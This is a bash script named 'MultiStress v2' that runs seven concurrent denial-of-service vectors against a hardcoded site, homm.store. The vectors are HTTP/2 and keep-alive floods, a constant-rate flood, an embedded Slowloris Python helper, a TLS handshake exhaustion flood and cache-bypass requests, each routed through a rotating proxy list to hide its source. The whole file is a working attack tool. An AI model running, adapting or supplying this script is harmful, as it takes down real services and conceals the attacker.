#!/bin/bash
# MultiStress v2 — macOS, with proxy rotation
set -euo pipefail

TARGET="https://homm.store"
TARGET_HOST="homm.store"
TARGET_PORT=443
DURATION=300
WORKERS=400
PROXIES_FILE="${1:-proxies.txt}"
LOG_DIR="/tmp/multistress_$(date +%s)"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; MAGENTA='\033[0;35m'
BOLD='\033[1m'; RESET='\033[0m'

PIDS=(); PC_CONFIGS=()

log()  { echo -e "${BOLD}[$(date +%H:%M:%S)]${RESET} $*"; }
ok()   { echo -e "${GREEN}  [OK]${RESET} $*"; }
warn() { echo -e "${YELLOW}  [WARN]${RESET} $*"; }

load_proxies() {
  if [[ ! -f "$PROXIES_FILE" ]]; then
    warn "proxies.txt not found — running without proxies"; PROXIES=(""); return
  fi
  mapfile -t PROXIES < <(grep -v '^\s*#' "$PROXIES_FILE" | grep -v '^\s*$')
  log "Loaded ${#PROXIES[@]} proxies"
}

get_proxy() { echo "${PROXIES[$(( $1 % ${#PROXIES[@]} ))]}"; }

make_pc_config() {
  local proxy="$1" cfg="$2"
  if [[ -z "$proxy" ]]; then
    printf 'dynamic_chain\nproxy_dns\n[ProxyList]\n' > "$cfg"; return
  fi
  local proto rest userinfo hostinfo user pass host port pc_type
  proto="${proxy%%://*}"; rest="${proxy#*://}"
  if [[ "$rest" == *@* ]]; then
    userinfo="${rest%%@*}"; hostinfo="${rest##*@}"
    user="${userinfo%%:*}"; pass="${userinfo#*:}"
  else
    hostinfo="$rest"; user=""; pass=""
  fi
  host="${hostinfo%%:*}"; port="${hostinfo##*:}"
  [[ "$proto" == "http" ]] && pc_type="http" || pc_type="socks5"
  { echo "strict_chain"; echo "proxy_dns"; echo "[ProxyList]"
    [[ -n "$user" ]] && echo "$pc_type  $host  $port  $user  $pass" \
                     || echo "$pc_type  $host  $port"; } > "$cfg"
}

run_via_proxy() {
  local proxy="$1"; shift
  local cfg; cfg=$(mktemp /tmp/pc_XXXXXX.conf)
  PC_CONFIGS+=("$cfg"); make_pc_config "$proxy" "$cfg"
  [[ -z "$proxy" ]] && "$@" || proxychains4 -q -f "$cfg" "$@"
}

install_tools() {
  log "Checking dependencies..."
  command -v brew &>/dev/null || \
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

  command -v go &>/dev/null || brew install go
  export PATH="$PATH:$(go env GOPATH)/bin"

  command -v proxychains4 &>/dev/null || brew install proxychains-ng || \
    warn "proxychains not available"

  command -v slowhttptest &>/dev/null || brew install slowhttptest 2>/dev/null || true
  python3 -m pip install -q PySocks 2>/dev/null || true

  for t in \
    "github.com/codesenberg/bombardier@latest" \
    "github.com/rakyll/hey@latest" \
    "github.com/tsenart/vegeta@latest" \
    "fortio.org/fortio@latest"; do
    name=$(basename "${t%@*}")
    command -v "$name" &>/dev/null || { log "Installing $name..."; go install "$t"; }
  done
  ok "All tools ready"
}

write_helpers() {
  cat > /tmp/slowloris_proxy.py << 'EOF'
import socket, ssl, time, threading, signal, sys, random, string, socks

HOST    = sys.argv[1]; PORT = int(sys.argv[2])
COUNT   = int(sys.argv[3]); TIMEOUT = int(sys.argv[4])
PROXY   = sys.argv[5] if len(sys.argv) > 5 else ""

def parse_proxy(p):
    if not p: return None
    proto = p.split("://")[0]; rest = p.split("://")[1]
    user = pw = None
    if "@" in rest:
        up, hp = rest.rsplit("@",1); user, pw = up.split(":",1)
    else: hp = rest
    h, port = hp.rsplit(":",1)
    return (socks.SOCKS5 if "socks5" in proto else socks.HTTP, h, int(port), True, user, pw)

proxy_cfg = parse_proxy(PROXY)
sockets = []; lock = threading.Lock(); stop = threading.Event()

def make_sock():
    s = socks.socksocket() if proxy_cfg else socket.socket()
    if proxy_cfg: s.set_proxy(*proxy_cfg)
    s.settimeout(4)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(s, server_hostname=HOST); s.connect((HOST, PORT)); return s

def rand(n): return ''.join(random.choices(string.ascii_letters, k=n))
def open_all():
    for _ in range(COUNT):
        if stop.is_set(): break
        try:
            s = make_sock(); s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
            with lock: sockets.append(s)
        except: pass
    print(f"[slowloris] Opened {len(sockets)}", flush=True)

def keep():
    start = time.time()
    while not stop.is_set() and time.time()-start < TIMEOUT:
        dead = []
        with lock:
            for i,s in enumerate(sockets):
                try: s.send(f"X-A: {rand(6)}\r\n".encode())
                except: dead.append(i)
            for i in reversed(dead): sockets.pop(i)
        for _ in range(len(dead)):
            try:
                s = make_sock(); s.send(f"GET /?{rand(8)} HTTP/1.1\r\nHost: {HOST}\r\n".encode())
                with lock: sockets.append(s)
            except: pass
        print(f"[slowloris] alive={len(sockets)}", flush=True); time.sleep(10)

signal.signal(signal.SIGTERM, lambda *_: stop.set())
open_all(); keep()
EOF

  cat > /tmp/ssl_exhaustion_proxy.py << 'EOF'
import ssl, socket, time, threading, signal, sys, socks

HOST = sys.argv[1]; PORT = int(sys.argv[2])
THREADS = int(sys.argv[3]); TIMEOUT = int(sys.argv[4])
PROXY = sys.argv[5] if len(sys.argv) > 5 else ""

def parse_proxy(p):
    if not p: return None
    proto = p.split("://")[0]; rest = p.split("://")[1]
    user = pw = None
    if "@" in rest:
        up, hp = rest.rsplit("@",1); user, pw = up.split(":",1)
    else: hp = rest
    h, port = hp.rsplit(":",1)
    return (socks.SOCKS5 if "socks5" in proto else socks.HTTP, h, int(port), True, user, pw)

proxy_cfg = parse_proxy(PROXY); stop = threading.Event(); count = [0]; lock = threading.Lock()

def loop():
    while not stop.is_set():
        try:
            s = socks.socksocket() if proxy_cfg else socket.socket()
            if proxy_cfg: s.set_proxy(*proxy_cfg)
            s.settimeout(3)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            w = ctx.wrap_socket(s, server_hostname=HOST); w.connect((HOST, PORT)); w.close()
            with lock: count[0] += 1
        except: pass

signal.signal(signal.SIGTERM, lambda *_: stop.set())
ts = [threading.Thread(target=loop, daemon=True) for _ in range(THREADS)]
for t in ts: t.start()
start = time.time()
while time.time()-start < TIMEOUT and not stop.is_set():
    print(f"[ssl_exhaustion] {int(time.time()-start)}s handshakes={count[0]}", flush=True)
    time.sleep(5)
stop.set()
EOF
}

run_all() {
  mkdir -p "$LOG_DIR"; load_proxies; write_helpers
  p0=$(get_proxy 0); p1=$(get_proxy 1); p2=$(get_proxy 2); p3=$(get_proxy 3)
  p4=$(get_proxy 4); p5=$(get_proxy 5); p6=$(get_proxy 6)

  log "Launching 7 vectors on ${CYAN}$TARGET${RESET}\n"

  echo -e "${RED}[1/7 BOMBARDIER]${RESET}   HTTP/2 flood        → ${p0:-none}"
  ( run_via_proxy "$p0" bombardier -c "$WORKERS" -d "${DURATION}s" \
      -t 1500ms --http2 --insecure -l "$TARGET" ) > "$LOG_DIR/bombardier.log" 2>&1 & PIDS+=($!)

  echo -e "${GREEN}[2/7 HEY]${RESET}          keep-alive          → ${p1:-none}"
  ( run_via_proxy "$p1" hey -c "$WORKERS" -z "${DURATION}s" "$TARGET" ) \
    > "$LOG_DIR/hey.log" 2>&1 & PIDS+=($!)

  echo -e "${YELLOW}[3/7 VEGETA]${RESET}       Constant-rate       → ${p2:-none}"
  ( echo "GET $TARGET" | run_via_proxy "$p2" vegeta attack \
      -rate=0 -max-workers="$WORKERS" -duration="${DURATION}s" -insecure | \
    vegeta report -every=10s ) > "$LOG_DIR/vegeta.log" 2>&1 & PIDS+=($!)

  echo -e "${CYAN}[4/7 FORTIO]${RESET}       Latency-aware       → ${p3:-none}"
  ( run_via_proxy "$p3" fortio load -c "$WORKERS" -t "${DURATION}s" \
      -qps 0 -insecure "$TARGET" ) > "$LOG_DIR/fortio.log" 2>&1 & PIDS+=($!)

  echo -e "${MAGENTA}[5/7 SLOWLORIS]${RESET}    Slow connections    → ${p4:-none}"
  python3 /tmp/slowloris_proxy.py "$TARGET_HOST" "$TARGET_PORT" 200 "$DURATION" "$p4" \
    > "$LOG_DIR/slowloris.log" 2>&1 & PIDS+=($!)

  echo -e "${BLUE}[6/7 SSL_EXHAUST]${RESET}  TLS handshake flood → ${p5:-none}"
  python3 /tmp/ssl_exhaustion_proxy.py "$TARGET_HOST" "$TARGET_PORT" 100 "$DURATION" "$p5" \
    > "$LOG_DIR/ssl_exhaustion.log" 2>&1 & PIDS+=($!)

  echo -e "${RED}[7/7 CACHE_BYPASS]${RESET} Random query         → ${p6:-none}"
  ( run_via_proxy "$p6" hey -c "$WORKERS" -z "${DURATION}s" \
      -H "Cache-Control: no-cache" \
      "${TARGET}?bust=$(jot -r 1 1 9999999)" ) \
    > "$LOG_DIR/cache_bypass.log" 2>&1 & PIDS+=($!)

  echo -e "\nLogs: $LOG_DIR/ | Ctrl+C to stop\n"
  tail -f "$LOG_DIR"/*.log & PIDS+=($!)

  local start_ts=$(date +%s)
  while [[ $(( $(date +%s) - start_ts )) -lt $DURATION ]]; do
    local el=$(( $(date +%s) - start_ts ))
    local pct=$(( el * 100 / DURATION ))
    printf "\r[%-40s] %d%% %ds/%ds" \
      "$(python3 -c "print('#'*$((pct*40/100)) + '-'*$((40-pct*40/100)))")" \
      "$pct" "$el" "$DURATION"
    sleep 2
  done

  echo -e "\n\n${GREEN}[OK] Done.${RESET}"
  for t in bombardier hey vegeta fortio slowloris ssl_exhaustion cache_bypass; do
    echo -e "\n${BOLD}[$t]${RESET}"; tail -8 "$LOG_DIR/$t.log" 2>/dev/null
  done
  for cfg in "${PC_CONFIGS[@]}"; do rm -f "$cfg"; done
}

trap 'kill "${PIDS[@]}" 2>/dev/null; for c in "${PC_CONFIGS[@]}"; do rm -f "$c"; done; exit 0' INT TERM

echo -e "\n${BOLD}${RED}>> MULTISTRESS v2${RESET} — macOS — proxy mode"
echo -e "   Proxies: ${CYAN}$PROXIES_FILE${RESET}\n"
install_tools; run_all
